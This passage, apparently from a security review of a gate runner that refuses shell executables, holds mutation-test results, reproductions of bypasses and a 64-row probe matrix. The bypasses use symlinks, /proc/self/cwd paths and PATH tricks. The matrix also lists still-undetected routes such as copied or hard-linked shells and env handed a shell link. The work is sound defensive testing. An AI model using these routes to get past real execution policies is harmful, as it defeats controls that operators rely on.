J03 | SHELL_RUNNERS loses su | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('su', '-c', 'a;b')]
J04 | no lower-casing in _base | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('BASH', '-c', 'a')]
J05 | .exe not stripped | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('bash.exe', '-c', 'a')]
J06 | wrong suffix stripped | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('bash.exe', '-c', 'a')]
J07 | no basename (whole word) | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/bin/sh', '-c', 'id && id')]
J08 | resolution result not used (rev 3c text: the hit is returned unwalked) | KILLED | FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
J09 | PATH lookup dropped (rev 3 text) | KILLED | FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
J10 | PATH lookup limited to /bin (rev 3 text) | KILLED | FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
J11 | slash test on backslash (rev 3 text) | KILLED | FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
J12 | resolution result ignored (names = literal only) | KILLED | FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
J13 | wrapper rule skips the first later arg | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/usr/bin/env', 'bash')]
J14 | wrapper rule scans argv incl. argv[0] (maybe equivalent) | SURVIVED | 677 passed in 27.53s
J15 | wrapper rule: and -> or | KILLED | FAILED tests/test_gates.py::test_ordinary_programs_are_not_mistaken_for_shells[pytest -k bash]
J16 | wrapper later-arg compared without basename | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('find', '.', '-execdir', '/bin/bash', ']
J17 | wrapper name compared case-sensitively with raw argv[0] | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/usr/bin/env', 'bash')]
J18 | wrapper rule dropped | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/usr/bin/env', 'bash')]
J19 | shell check also on declared shell gates | KILLED | FAILED tests/test_gates.py::test_proof_shell_true_only_when_declared_and_allowed
J20 | shell check only on declared shell gates | KILLED | FAILED tests/test_gates.py::test_proof_shell_true_only_when_declared_and_allowed
J21 | shell check dropped entirely | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('sh', '-c', 'echo A; echo B > out.txt &]
J22 | wrapper message reuses the shell message (maybe equivalent) | KILLED | FAILED tests/test_gates.py::test_the_documented_wrapper_false_positives_are_refused[timeout 5 pytest tests/shell/sh]
J23 | OSError while resolving accepted (rev 3c text: fail open instead of a refusal) | KILLED | FAILED tests/test_gates.py::test_an_unreadable_link_or_any_os_error_while_resolving_is_a_refusal_not_a_pass
J24 | SHELL_NAMES loses ash | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('ash', '-c', 'a')]
J25 | SHELL_NAMES loses fish | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('fish', '-c', 'a')]
J26 | SHELL_NAMES loses rbash | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J27 | SHELL_NAMES loses tcsh | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('tcsh', '-c', 'a')]
J28 | SHELL_NAMES loses posh | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J29 | SHELL_NAMES loses yash | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J30 | SHELL_NAMES loses sh | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('Sh', '-c', 'a')]
J31 | WRAPPERS loses timeout | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('timeout', '5', 'sh', '-c', 'a')]
J32 | WRAPPERS loses xargs | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('xargs', '-I{}', 'sh', '-c', '{}')]
J33 | WRAPPERS loses find | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('find', '.', '-exec', 'sh', '-c', 'a;b']
J34 | WRAPPERS loses env | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/usr/bin/env', 'bash')]
J35 | WRAPPERS gains pytest | KILLED | FAILED tests/test_gates.py::test_ordinary_programs_are_not_mistaken_for_shells[pytest -k bash]
J36 | WRAPPERS gains python | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J37 | WRAPPERS loses parallel | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J38 | SIGHUP not handled | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J39 | SIGTERM not handled | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J40 | handler order swapped (maybe equivalent) | KILLED | FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
J41 | exit code is the signal number | KILLED | FAILED tests/test_gates.py::test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass[SIGTERM]
J42 | exit code fixed 143 | KILLED | FAILED tests/test_gates.py::test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass[SIGHUP]
J43 | off-main-thread guard removed | KILLED | FAILED tests/test_gates.py::test_the_handlers_are_left_alone_off_the_main_thread
J44 | only the first handler restored | KILLED | FAILED tests/test_gates.py::test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored[SIGHUP]
J45 | handlers never installed | KILLED | FAILED tests/test_gates.py::test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass[SIGTERM]
J46 | restore None falls back to SIG_IGN | KILLED | FAILED tests/test_gates.py::test_a_handler_installed_from_c_is_restored_to_the_default
J47 | handlers restored before the run finishes (inside try) | KILLED | FAILED tests/test_gates.py::test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored[SIGTERM]
J48 | restore only when not None | KILLED | FAILED tests/test_gates.py::test_a_handler_installed_from_c_is_restored_to_the_default
TOTAL 48 killed 47 survived ['J14'] bad []
```

**12. ATK4 reproduced on rev 2, then closed (rev 3).** Scratch tree `r3demo/` (`sub/mysh -> /bin/sh`, `other/`), the judge's two gate files, run against the rev-2 tree and the rev-3 tree:

```
$ rev 2 tree (the judge repros, runner src = rev 2):
--- variant 1 (cwd sub, process in parent)
exit=0
pass ''
sub/out.txt
--- variant 2 (process in other/, --root ../sub)
exit=0
pass ''
sub/out2.txt

$ rev 3 tree (shipped patch):
--- variant 1 (cwd sub, process in parent)
exit=2
policy-error 'the executable is a shell; declare shell: true and pass --allow-shell'
ls: cannot access 'sub/out.txt': No such file or directory
--- variant 2 (process in other/, --root ../sub)
exit=2
policy-error 'the executable is a shell; declare shell: true and pass --allow-shell'
ls: cannot access 'sub/out2.txt': No such file or directory
```

The rev-3 test file run against the rev-2 source (`final_r2tests`): `10 failed, 495 passed in 14.44s`.

**13. ATK5 reproduced on rev 3, then closed (rev 3b).** Scratch tree `r3demo/` (`sub/mysh -> /bin/sh`; two gates `/proc/self/cwd/mysh` and `/proc/thread-self/cwd/./mysh`, cwd `sub`, runner in the parent folder):

```
$ rev 3 tree (last round), the judge repro and a second /proc word:
exit=0
proc pass ''
proc2 pass ''
sub/out.txt
sub/out2.txt

$ rev 3b tree (shipped patch):
exit=2
proc policy-error 'the executable is under /proc or /dev, which the runner and the child resolve differently'
proc2 policy-error 'the executable is under /proc or /dev, which the runner and the child resolve differently'
ls: cannot access 'sub/out.txt': No such file or directory
ls: cannot access 'sub/out2.txt': No such file or directory
```

The rev-3b test file run against the rev-3 source (`final_r3`): `34 failed, 509 passed in 16.19s`.

**14. D1 and its two siblings reproduced, then closed (rev 3c): the probe matrix.** `02_strategy-architect_C9_probe_matrix.py` (rows in `tests/gate_matrix.py`, real CLI `python -m master_finhub.evals.gates`, three runner placements: M1 runner cwd `B/a/b` with `--root B`, M2 runner cwd = the gate's cwd, M3 runner cwd `B/a/b` with `--root B/sub` and the default gate cwd; verdict REFUSED = exit 2, status policy-error and no MARK in every placement it runs; BYPASS = the test-made shell ran and created MARK; LIMIT = a documented limit whose MARK is expected). Each row builds a fresh folder with a test-made "shell" (an executable called `bash` that creates MARK with a builtin), the row's links and one gate. Rev-3b tree first (the 3b source with the rev-3c rows): the D1 rows r08-r13 and the two further classes r38, r48, r49 bypass:

```
row   description                                                    M1 other  M2 same   M3 root=sub verdict
r01   file named like a shell                                        refused   refused   refused     REFUSED
r02   link last, relative target                                     refused   refused   refused     REFUSED
r03   link last, absolute target                                     refused   refused   refused     REFUSED
r04   chain mixing absolute and relative targets                     refused   refused   refused     REFUSED
r05   dir link in the middle                                         refused   refused   refused     REFUSED
r06   dir link first, absolute word                                  refused   refused   refused     REFUSED
r07   target climbing to the root                                    refused   refused   refused     REFUSED
r08   D1: .. after a link to /proc/self/cwd                          MARK      refused   n/a         BYPASS
r09   D1 absolute word                                               MARK      refused   n/a         BYPASS
r10   D1 with ./                                                     MARK      refused   n/a         BYPASS
r11   D1 link to /proc/thread-self/cwd                               MARK      refused   n/a         BYPASS
r12   D1 as a PATH entry lnk/..                                      MARK      refused   n/a         BYPASS
r13   D1 string form                                                 MARK      refused   n/a         BYPASS
r14   .. after a plain directory link                                refused   refused   n/a         REFUSED
r15   .. with no link at all (cost: refused)                         refused   refused   n/a         REFUSED
r16   /proc/self/cwd/<link>                                          refused   refused   refused     REFUSED
r17   /proc/thread-self/cwd/<link>                                   refused   refused   refused     REFUSED
r18   /proc/self/cwd/./<link>                                        refused   refused   refused     REFUSED
r19   /proc//self/cwd//<link>                                        refused   refused   refused     REFUSED
r20   //proc/self/cwd/<link>                                         refused   refused   refused     REFUSED
r21   /./proc/self/cwd/<link>                                        refused   refused   refused     REFUSED
r22   /proc/self/root/<B>/sub/<link>                                 refused   refused   refused     REFUSED
r23   /proc/self/exe                                                 refused   refused   refused     REFUSED
r24   /proc/self/fd/0                                                refused   refused   refused     REFUSED
r25   /dev/fd/0                                                      refused   refused   refused     REFUSED
r26   /dev/stdin                                                     refused   refused   refused     REFUSED
r27   /dev/null                                                      refused   refused   refused     REFUSED
r28   /dev/shm/x (cost: refused)                                     refused   refused   refused     REFUSED
r29   /proc/1/root/bin/sh                                            refused   refused   refused     REFUSED
r30   /dev//fd/0 and /dev/./fd/0                                     refused   refused   refused     REFUSED
r31   link to /proc/self/cwd/<link>                                  refused   refused   refused     REFUSED
r32   dir link to /proc/self/cwd                                     refused   refused   refused     REFUSED
r33   dir link to /dev then fd/0                                     refused   refused   refused     REFUSED
r34   chain ending in /dev/stdin                                     refused   refused   refused     REFUSED
r35   link to /proc/self/exe                                         refused   refused   refused     REFUSED
r36   link target climbs with .. to the root, then /proc/self/cwd/<l refused   refused   refused     REFUSED
r37   dir link up to / (all ..), then proc/self/cwd/<link>           refused   refused   refused     REFUSED
r38   D1 inside a link TARGET: lnk/../mysh with lnk -> /proc/self/cw MARK      refused   MARK        BYPASS
r39   link target climbs with .. to /dev/fd                          refused   refused   refused     REFUSED
r40   relative PATH entry                                            refused   refused   refused     REFUSED
r41   empty PATH entry                                               refused   refused   refused     REFUSED
r42   PATH entry .                                                   refused   refused   refused     REFUSED
r43   PATH entry /proc/self/cwd                                      refused   refused   refused     REFUSED
r44   directory link in PATH                                         refused   refused   refused     REFUSED
r45   PATH entry that is a link to /proc/self/cwd                    refused   refused   refused     REFUSED
r46   PATH entry with ..                                             refused   refused   n/a         REFUSED
r47   first PATH hit is the shell link                               refused   refused   refused     REFUSED
r48   PATH hit is a link into /proc/self/cwd (relative entry; the ru MARK      refused   MARK        BYPASS
r49   PATH hit is a link into /proc/self/cwd (absolute entry)        MARK      refused   MARK        BYPASS
r50   .//mysh and ./././mysh                                         refused   refused   refused     REFUSED
r51   trailing slash                                                 refused   refused   refused     REFUSED
r52   case: MYSH                                                     refused   refused   refused     REFUSED
r53   symlinked gate cwd                                             refused   refused   n/a         REFUSED
r54   symlinked --root                                               refused   refused   refused     REFUSED
r55   link in a subfolder of the gate cwd                            refused   refused   refused     REFUSED
r58   //dev/null (QA Q26: the double-slash form)                     refused   refused   refused     REFUSED
r59   //proc/1/cwd/x (another pid, double slash)                     refused   refused   refused     REFUSED
r57   links first, middle and last in one word (a1/a2/mysh)          refused   refused   refused     REFUSED
r56   LIMIT: env handed a link to a shell                            MARK      MARK      MARK        LIMIT: the wrapper rule compares argument names, not what a link points at: not detected
l01   LIMIT: a copy of a shell                                       MARK      MARK      MARK        LIMIT: a copy has its own name and content: not detected
l02   LIMIT: a hard link of a shell                                  MARK      MARK      MARK        LIMIT: a hard link is a second name for the same inode: not detected
l03   LIMIT: a symlink to a wrapper                                  MARK      MARK      MARK        LIMIT: a link to a wrapper is not a wrapper name: not detected
l04   LIMIT: earlier PATH file exec skips (no shebang)               MARK      MARK      MARK        LIMIT: exec skips d1/mysh (ENOEXEC) and runs d2/mysh; the plan stops at d1
l05   LIMIT: a shell not in the 14 names                             MARK      MARK      MARK        LIMIT: the list has 14 names; ksh93 is not one
SUMMARY {'REFUSED': 49, 'LIMIT': 6, 'BYPASS': 9, 'ANOMALY': 0} rows 64
```

Rev-3c tree (shipped patch): every row refused or a documented limit, 0 bypass:

```
row   description                                                    M1 other  M2 same   M3 root=sub verdict
r01   file named like a shell                                        refused   refused   refused     REFUSED
r02   link last, relative target                                     refused   refused   refused     REFUSED
r03   link last, absolute target                                     refused   refused   refused     REFUSED
r04   chain mixing absolute and relative targets                     refused   refused   refused     REFUSED
r05   dir link in the middle                                         refused   refused   refused     REFUSED
r06   dir link first, absolute word                                  refused   refused   refused     REFUSED
r07   target climbing to the root                                    refused   refused   refused     REFUSED
r08   D1: .. after a link to /proc/self/cwd                          refused   refused   n/a         REFUSED
r09   D1 absolute word                                               refused   refused   n/a         REFUSED
r10   D1 with ./                                                     refused   refused   n/a         REFUSED
r11   D1 link to /proc/thread-self/cwd                               refused   refused   n/a         REFUSED
r12   D1 as a PATH entry lnk/..                                      refused   refused   n/a         REFUSED
r13   D1 string form                                                 refused   refused   n/a         REFUSED
r14   .. after a plain directory link                                refused   refused   n/a         REFUSED
r15   .. with no link at all (cost: refused)                         refused   refused   n/a         REFUSED
r16   /proc/self/cwd/<link>                                          refused   refused   refused     REFUSED
r17   /proc/thread-self/cwd/<link>                                   refused   refused   refused     REFUSED
r18   /proc/self/cwd/./<link>                                        refused   refused   refused     REFUSED
r19   /proc//self/cwd//<link>                                        refused   refused   refused     REFUSED
r20   //proc/self/cwd/<link>                                         refused   refused   refused     REFUSED
r21   /./proc/self/cwd/<link>                                        refused   refused   refused     REFUSED
r22   /proc/self/root/<B>/sub/<link>                                 refused   refused   refused     REFUSED
r23   /proc/self/exe                                                 refused   refused   refused     REFUSED
r24   /proc/self/fd/0                                                refused   refused   refused     REFUSED
r25   /dev/fd/0                                                      refused   refused   refused     REFUSED
r26   /dev/stdin                                                     refused   refused   refused     REFUSED
r27   /dev/null                                                      refused   refused   refused     REFUSED
r28   /dev/shm/x (cost: refused)                                     refused   refused   refused     REFUSED
r29   /proc/1/root/bin/sh                                            refused   refused   refused     REFUSED
r30   /dev//fd/0 and /dev/./fd/0                                     refused   refused   refused     REFUSED
r31   link to /proc/self/cwd/<link>                                  refused   refused   refused     REFUSED
r32   dir link to /proc/self/cwd                                     refused   refused   refused     REFUSED
r33   dir link to /dev then fd/0                                     refused   refused   refused     REFUSED
r34   chain ending in /dev/stdin                                     refused   refused   refused     REFUSED
r35   link to /proc/self/exe                                         refused   refused   refused     REFUSED
r36   link target climbs with .. to the root, then /proc/self/cwd/<l refused   refused   refused     REFUSED
r37   dir link up to / (all ..), then proc/self/cwd/<link>           refused   refused   refused     REFUSED
r38   D1 inside a link TARGET: lnk/../mysh with lnk -> /proc/self/cw refused   refused   refused     REFUSED
r39   link target climbs with .. to /dev/fd                          refused   refused   refused     REFUSED
r40   relative PATH entry                                            refused   refused   refused     REFUSED
r41   empty PATH entry                                               refused   refused   refused     REFUSED
r42   PATH entry .                                                   refused   refused   refused     REFUSED
r43   PATH entry /proc/self/cwd                                      refused   refused   refused     REFUSED
r44   directory link in PATH                                         refused   refused   refused     REFUSED
r45   PATH entry that is a link to /proc/self/cwd                    refused   refused   refused     REFUSED
r46   PATH entry with ..                                             refused   refused   n/a         REFUSED
r47   first PATH hit is the shell link                               refused   refused   refused     REFUSED
r48   PATH hit is a link into /proc/self/cwd (relative entry; the ru refused   refused   refused     REFUSED
r49   PATH hit is a link into /proc/self/cwd (absolute entry)        refused   refused   refused     REFUSED
r50   .//mysh and ./././mysh                                         refused   refused   refused     REFUSED
r51   trailing slash                                                 refused   refused   refused     REFUSED
r52   case: MYSH                                                     refused   refused   refused     REFUSED
r53   symlinked gate cwd                                             refused   refused   n/a         REFUSED
r54   symlinked --root                                               refused   refused   refused     REFUSED
r55   link in a subfolder of the gate cwd                            refused   refused   refused     REFUSED
r58   //dev/null (QA Q26: the double-slash form)                     refused   refused   refused     REFUSED
r59   //proc/1/cwd/x (another pid, double slash)                     refused   refused   refused     REFUSED
r57   links first, middle and last in one word (a1/a2/mysh)          refused   refused   refused     REFUSED
r56   LIMIT: env handed a link to a shell                            MARK      MARK      MARK        LIMIT: the wrapper rule compares argument names, not what a link points at: not detected
l01   LIMIT: a copy of a shell                                       MARK      MARK      MARK        LIMIT: a copy has its own name and content: not detected
l02   LIMIT: a hard link of a shell                                  MARK      MARK      MARK        LIMIT: a hard link is a second name for the same inode: not detected
l03   LIMIT: a symlink to a wrapper                                  MARK      MARK      MARK        LIMIT: a link to a wrapper is not a wrapper name: not detected
l04   LIMIT: earlier PATH file exec skips (no shebang)               MARK      MARK      MARK        LIMIT: exec skips d1/mysh (ENOEXEC) and runs d2/mysh; the plan stops at d1
l05   LIMIT: a shell not in the 14 names                             MARK      MARK      MARK        LIMIT: the list has 14 names; ksh93 is not one
SUMMARY {'REFUSED': 58, 'LIMIT': 6, 'BYPASS': 0, 'ANOMALY': 0} rows 64
```

The same matrix under `strace -f -e trace=execve` on the shipped tree (the last column counts exec calls of the gate's own executable in M1/M2/M3: refused rows show 0, limit rows show the child really running), and on rev 3b (bypass rows show 1 where the plan accepted):

```
row   description                                                    M1 other  M2 same   M3 root=sub verdict
r01   file named like a shell                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r02   link last, relative target                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r03   link last, absolute target                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r04   chain mixing absolute and relative targets                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r05   dir link in the middle                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r06   dir link first, absolute word                                  refused   refused   refused     REFUSED  [gate execs 0/0/0]
r07   target climbing to the root                                    refused   refused   refused     REFUSED  [gate execs 0/0/0]
r08   D1: .. after a link to /proc/self/cwd                          refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r09   D1 absolute word                                               refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r10   D1 with ./                                                     refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r11   D1 link to /proc/thread-self/cwd                               refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r12   D1 as a PATH entry lnk/..                                      refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r13   D1 string form                                                 refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r14   .. after a plain directory link                                refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r15   .. with no link at all (cost: refused)                         refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r16   /proc/self/cwd/<link>                                          refused   refused   refused     REFUSED  [gate execs 0/0/0]
r17   /proc/thread-self/cwd/<link>                                   refused   refused   refused     REFUSED  [gate execs 0/0/0]
r18   /proc/self/cwd/./<link>                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r19   /proc//self/cwd//<link>                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r20   //proc/self/cwd/<link>                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r21   /./proc/self/cwd/<link>                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r22   /proc/self/root/<B>/sub/<link>                                 refused   refused   refused     REFUSED  [gate execs 0/0/0]
r23   /proc/self/exe                                                 refused   refused   refused     REFUSED  [gate execs 0/0/0]
r24   /proc/self/fd/0                                                refused   refused   refused     REFUSED  [gate execs 0/0/0]
r25   /dev/fd/0                                                      refused   refused   refused     REFUSED  [gate execs 0/0/0]
r26   /dev/stdin                                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r27   /dev/null                                                      refused   refused   refused     REFUSED  [gate execs 0/0/0]
r28   /dev/shm/x (cost: refused)                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r29   /proc/1/root/bin/sh                                            refused   refused   refused     REFUSED  [gate execs 0/0/0]
r30   /dev//fd/0 and /dev/./fd/0                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r31   link to /proc/self/cwd/<link>                                  refused   refused   refused     REFUSED  [gate execs 0/0/0]
r32   dir link to /proc/self/cwd                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r33   dir link to /dev then fd/0                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r34   chain ending in /dev/stdin                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r35   link to /proc/self/exe                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r36   link target climbs with .. to the root, then /proc/self/cwd/<l refused   refused   refused     REFUSED  [gate execs 0/0/0]
r37   dir link up to / (all ..), then proc/self/cwd/<link>           refused   refused   refused     REFUSED  [gate execs 0/0/0]
r38   D1 inside a link TARGET: lnk/../mysh with lnk -> /proc/self/cw refused   refused   refused     REFUSED  [gate execs 0/0/0]
r39   link target climbs with .. to /dev/fd                          refused   refused   refused     REFUSED  [gate execs 0/0/0]
r40   relative PATH entry                                            refused   refused   refused     REFUSED  [gate execs 0/0/0]
r41   empty PATH entry                                               refused   refused   refused     REFUSED  [gate execs 0/0/0]
r42   PATH entry .                                                   refused   refused   refused     REFUSED  [gate execs 0/0/0]
r43   PATH entry /proc/self/cwd                                      refused   refused   refused     REFUSED  [gate execs 0/0/0]
r44   directory link in PATH                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r45   PATH entry that is a link to /proc/self/cwd                    refused   refused   refused     REFUSED  [gate execs 0/0/0]
r46   PATH entry with ..                                             refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r47   first PATH hit is the shell link                               refused   refused   refused     REFUSED  [gate execs 0/0/0]
r48   PATH hit is a link into /proc/self/cwd (relative entry; the ru refused   refused   refused     REFUSED  [gate execs 0/0/0]
r49   PATH hit is a link into /proc/self/cwd (absolute entry)        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r50   .//mysh and ./././mysh                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r51   trailing slash                                                 refused   refused   refused     REFUSED  [gate execs 0/0/0]
r52   case: MYSH                                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r53   symlinked gate cwd                                             refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r54   symlinked --root                                               refused   refused   refused     REFUSED  [gate execs 0/0/0]
r55   link in a subfolder of the gate cwd                            refused   refused   refused     REFUSED  [gate execs 0/0/0]
r58   //dev/null (QA Q26: the double-slash form)                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r59   //proc/1/cwd/x (another pid, double slash)                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r57   links first, middle and last in one word (a1/a2/mysh)          refused   refused   refused     REFUSED  [gate execs 0/0/0]
r56   LIMIT: env handed a link to a shell                            MARK      MARK      MARK        LIMIT: the wrapper rule compares argument names, not what a link points at: not detected  [gate execs 14/14/14]
l01   LIMIT: a copy of a shell                                       MARK      MARK      MARK        LIMIT: a copy has its own name and content: not detected  [gate execs 1/1/1]
l02   LIMIT: a hard link of a shell                                  MARK      MARK      MARK        LIMIT: a hard link is a second name for the same inode: not detected  [gate execs 1/1/1]
l03   LIMIT: a symlink to a wrapper                                  MARK      MARK      MARK        LIMIT: a link to a wrapper is not a wrapper name: not detected  [gate execs 2/2/2]
l04   LIMIT: earlier PATH file exec skips (no shebang)               MARK      MARK      MARK        LIMIT: exec skips d1/mysh (ENOEXEC) and runs d2/mysh; the plan stops at d1  [gate execs 2/2/2]
l05   LIMIT: a shell not in the 14 names                             MARK      MARK      MARK        LIMIT: the list has 14 names; ksh93 is not one  [gate execs 1/1/1]
SUMMARY {'REFUSED': 58, 'LIMIT': 6, 'BYPASS': 0, 'ANOMALY': 0} rows 64
```

```
row   description                                                    M1 other  M2 same   M3 root=sub verdict
r01   file named like a shell                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r02   link last, relative target                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r03   link last, absolute target                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r04   chain mixing absolute and relative targets                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r05   dir link in the middle                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r06   dir link first, absolute word                                  refused   refused   refused     REFUSED  [gate execs 0/0/0]
r07   target climbing to the root                                    refused   refused   refused     REFUSED  [gate execs 0/0/0]
r08   D1: .. after a link to /proc/self/cwd                          MARK      refused   n/a         BYPASS  [gate execs 1/0/-]
r09   D1 absolute word                                               MARK      refused   n/a         BYPASS  [gate execs 1/0/-]
r10   D1 with ./                                                     MARK      refused   n/a         BYPASS  [gate execs 1/0/-]
r11   D1 link to /proc/thread-self/cwd                               MARK      refused   n/a         BYPASS  [gate execs 1/0/-]
r12   D1 as a PATH entry lnk/..                                      MARK      refused   n/a         BYPASS  [gate execs 1/0/-]
r13   D1 string form                                                 MARK      refused   n/a         BYPASS  [gate execs 1/0/-]
r14   .. after a plain directory link                                refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r15   .. with no link at all (cost: refused)                         refused   refused   n/a         REFUSED  [gate execs 0/0/-]
r16   /proc/self/cwd/<link>                                          refused   refused   refused     REFUSED  [gate execs 0/0/0]
r17   /proc/thread-self/cwd/<link>                                   refused   refused   refused     REFUSED  [gate execs 0/0/0]
r18   /proc/self/cwd/./<link>                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r19   /proc//self/cwd//<link>                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r20   //proc/self/cwd/<link>                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r21   /./proc/self/cwd/<link>                                        refused   refused   refused     REFUSED  [gate execs 0/0/0]
r22   /proc/self/root/<B>/sub/<link>                                 refused   refused   refused     REFUSED  [gate execs 0/0/0]
r23   /proc/self/exe                                                 refused   refused   refused     REFUSED  [gate execs 0/0/0]
r24   /proc/self/fd/0                                                refused   refused   refused     REFUSED  [gate execs 0/0/0]
r25   /dev/fd/0                                                      refused   refused   refused     REFUSED  [gate execs 0/0/0]
r26   /dev/stdin                                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r27   /dev/null                                                      refused   refused   refused     REFUSED  [gate execs 0/0/0]
r28   /dev/shm/x (cost: refused)                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r29   /proc/1/root/bin/sh                                            refused   refused   refused     REFUSED  [gate execs 0/0/0]
r30   /dev//fd/0 and /dev/./fd/0                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r31   link to /proc/self/cwd/<link>                                  refused   refused   refused     REFUSED  [gate execs 0/0/0]
r32   dir link to /proc/self/cwd                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r33   dir link to /dev then fd/0                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r34   chain ending in /dev/stdin                                     refused   refused   refused     REFUSED  [gate execs 0/0/0]
r35   link to /proc/self/exe                                         refused   refused   refused     REFUSED  [gate execs 0/0/0]
r36   link target climbs with .. to the root, then /proc/self/cwd/<l refused   refused   refused     REFUSED  [gate execs 0/0/0]
r37   dir link up to / (all ..), then proc/self/cwd/<link>           refused   refused   refused     REFUSED  [gate execs 0/0/0]
r38   D1 inside a link TARGET: lnk/../mysh with lnk -> /proc/self/cw MARK      refused   MARK        BYPASS  [gate execs 1/0/1]
r39   link target climbs with .. to /dev/fd                          refused   refused   refused     REFUSED  [gate execs 0/0/0]
r40   relative PATH entry                                            refused   refused   refused     REFUSED  [gate execs 0/0/0]
